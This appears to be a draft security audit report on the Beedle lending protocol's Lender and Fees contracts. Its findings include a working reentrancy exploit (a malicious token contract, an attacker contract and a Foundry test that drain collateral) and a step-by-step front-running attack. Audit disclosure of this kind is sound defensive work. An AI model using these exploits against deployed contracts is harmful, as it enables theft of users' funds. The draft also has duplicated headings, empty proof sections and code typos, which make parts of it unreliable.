# High 

### [H-1]: `Beedle::Lender.sol` incorrectly calculates the `loanRatio` which can lead to losses

**Description:** Due to decimals mismatching an issue stems out which leads to incorrect calculation of `loanRatio`. This allows users to borrows more than intended due to decimal mismatch.

```solidity
    uint256 loanRatio = (debt * 10 ** 18) / collateral;
```

<b>Instances:</b>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232-L287>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355-L432>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591-L710>


**Impact:** Since, user can provide less collateral but he's able to borrow more tokens than the collateral it can lead to significant loss of funds.

**Recommended Mitigations:**

Make sure to scale debt and collateral based on the token decimals in order to calculate properly the `loanRatio`. This can be easily done by changing the loanRatio calculation as follows:

```solidity
  uint256 loanRatio = ((debt * (10**(18 - loanToken.decimals()))) * 10 ** 18) / (collateral * (10 ** (18 - collateralToken.decimals())));
```

### [H-2] `Beedle::Lender.sol` can be drained due to Rentrancy in `repay` function

**Description:** Since, its is not defined which token to use as loan/collateral, anyone can use any token as loan/Collateral. An attacker can create an `ERC-777` token allowing reentrant calls on transfer to drain any token from the `Lender` contract. The `Lender` contract allows any token as `loanToken` and the `repay` function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability.

```solidity
	// transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
@>            delete loans[loanId];
        }
```

**Impact:** User's can claim collateral more than once, which will lead to losses.

**Proof Of Code:**

File: ExploitToken.sol

```solidity
//SPDX-License-Indeitifer:MIT
pragma solidity ^0.8.16;

import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";


contract ExploitToken is ERC20{

address owner;
    constructor(uint256 amount)ERC20("ExploitToken","ET"){
            owner = msg.sender;
            _mint(msg.sender, amount);
    }

    // This function overrides _afterTokenTransfer, a virtual function in the OpenZeppelin ERC20 contract.
    // It executes after every token transfer (transfer, transferFrom, or _mint). This hook will execute on all toke transfers
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
} 
```

File: Exploit7.sol

```solidity
//SPDX-License-Identifer: MIT
pragma solidity ^0.8.16;

import {ExploitToken} from "../src/ExploitToken.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/utils/Structs.sol";
import "../src/Lender.sol";

contract Exploit7{  

    Lender lender;
    bool loanBorrowed;
    uint256 i;
    address collateralToken;
    ExploitToken exploitToken;

    constructor(Lender _lender, address _collateralToken){
        lender=_lender;
        collateralToken=_collateralToken;
    }

    function attack(address _collateralToken) external{
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        exploitToken = new ExploitToken(1_000_000_000*10*18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);

        Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1_000_000*10*18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });

        bytes32 poolId = lender.setPool(pool);

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });

        Borrow[] memory borrows = new Borrow[](1);

        borrows[0] = b;        

        lender.borrow(borrows);

        // (4) Take another loan of exploitTokens to increase poolBalance

        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });

        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;

        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 /*amount*/) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the `repay` function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }
}
```
File: Lender.t.sol

Add the below test to file:

```solidity
unction test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000*10**18);
	collateralToken.transfer(address(attacker), 1_000*10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10_000*10**18);  // Lender contract has 10_000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1_000*10**18 + 1); // Attacker has 1_000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000*10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11_000*10**18); // Attacker has stolen all the 10_000 collateralToken
}

```

**Recommended Mitigations:** Always follow the:> Checks - Effect - Interactions CEI) pattern

### [H-3] `Beedle::Fees.sol` lacks slippage protection

**Description:** The `Fees::sellProfits()` functions lacks slippage protection, the `amountOutMinimum` and `sqrtPriceLimitX96` are set to `0` when swapping in uniswap pools this makes the user vulnerable to price manipulation attacks, and user will end getting very less or no tokens. 

```solidity
function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
@>                amountOutMinimum: 0, 
@>                sqrtPriceLimitX96: 0 
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
}

```

**Impact:** When swapping tokens user can end up with very less or losing up all of the tokens.

**Recommended Mitigations:**
Specify `amountOutMinimum` with some value instead of zero and if necessary, specify the `sqrtPriceLimitX96` parameter to set a stop price.


### [H-4] Missing checks in `buyLoan` function 

**Description:** The `buyLoan` function is not having any check for `minLoanSize` and `maxLoanRatio`. The problem is when there is no `maxloanRatio` check,  malicious actors can take advantage of this by buying a loan after an auction is started for very less collateral and can borrow a huge loan.

**Proof Of Code**:

1. User create a pool with very high interest lets say maximum interest.
2. From another wallet, the same user takes a borrow for 1000 USDC and gives 3000 USDT as collateral
3. User A calls startAuction for this loan. User B sees the loan on auction and since it has high interest rate and is well-collateralized, decides to buy it. User B calls buyLoan and passes to corresponding loanId.
4. User sees the pending transaction and front-runs it and changes his pool.maxLoanRatio to type(uint256).max (basically allowing for loans not sufficiently backed up by collateral)
5. After changing the maxLoanRatio, user A calls refinance and sets the loan debt to user B's pool balance and changes the collateral to 1 USDT.
6. After doing so, user A changes maxLoanRatio back to its original value and once again calls startAuction with the same loanId.
7. Considering steps 6-8 all executed before user B's buyLoan, user B's call now executes and they've bought a borrow for all of their pool balance, backed up by pretty much no collateral.
8. User A successfully executed the attack and has now taken a huge borrow which they have no incentive to repay as there isn't any valuable collateral attached to it.
9. User A can then either withdraw their funds from their pool or repeat the attack. 

**Impact:** Users will end up losing there funds

**Recommended Mitigations:** 

Add the below check:

```solidity
+        uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
+        if (loanRatio > pools[poolId].maxLoanRatio) revert RatioTooHigh();
```

### [H-4] Missing `msg.sender` check in `buyLoan` function 

**Description:** Due to insufficient checks in `buyLoan` function, it allows malicious actors to buy loan from auction by passing a `poolId` that they don't own (i.e is they are not the lender of the pool). As a result, the function incorrectly updates the loan's ownership to the malicious actor's address without requiring any collateral transfer.

The malicious actor identifies a loan in the auction and decides to purchase it. Using the `buyLoan` function, the malicious actor passes a `poolId` that they do not own and also may not Have the same loanTokens and collateralTokens ,since there are no checks for mismatching tokens which gives the malicious actor a lot of choice from pools. As a result, the function updates the loan ownership to the malicious actor's address while taking the debt from the pool provided by the malicious actor.

**Proof Of Code:**

********************************

**Impact:** Loan is permanently bricked and can never be repaid as attacker has become loan.lender.

**Recommended Mitigations:**

1. Lender.buyLoan() can validate that msg.sender is the pool's lender. This would stop anyone from matching an auctioned loan with a pool, so according to the system design this is not a great option,
2. Change [L518](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L518) to set loans\[loanId].lender to pools\[poolId].lender instead of msg.sender. This preserves the system design that anyone can match an auctioned loan with a pool so this is the better option.

### [H-5] Revert on `Beedle::Fees::sellProfits` function

**Description:** In the `Beedle::Fees::sellProfits` function token are not approved to be spent by the uniswap router. This will cause any call to `sellProfits` to always revert upon calling and will results in all tokens sent to the contract to be locked forever.

```solidity
	amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

**Impact:** This issue will make any ERC20 tokens sent to be contract to be permanently frozen in the contract.

**Recommended step:**

Add the below line to the code:

```solidity
    IERC20(_profits).approve(address(swapRouter), IERC20(_profits).balanceOf(address(this)))
    amount = swapRouter.exactInputSingle(params);
    IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

### [H-6] Borrows can prevent the loans from being liquidated 

**Description:** `Lender.buyLoan()` doesn't check if the poolId parameter is the same pool that has auctioned the loan. An attacker can use Lender.buyLoan() to grief the selling pool by stopping the auction via buying the auctioned loan back to the same pool. This also reduces that pool's balance and increases that pool's outstanding loans, negatively impacting the pool's financials.

**Impact:** Attacker can grief any auction stopping it at will by buying the auctioned loan back to the originating pool. This also decreases the pool's balance & increases the pool's outstanding loans, hurting the pool financially.

**Proof Of Code:**

**Recommended Mitigations:**

# Medium 

# Low
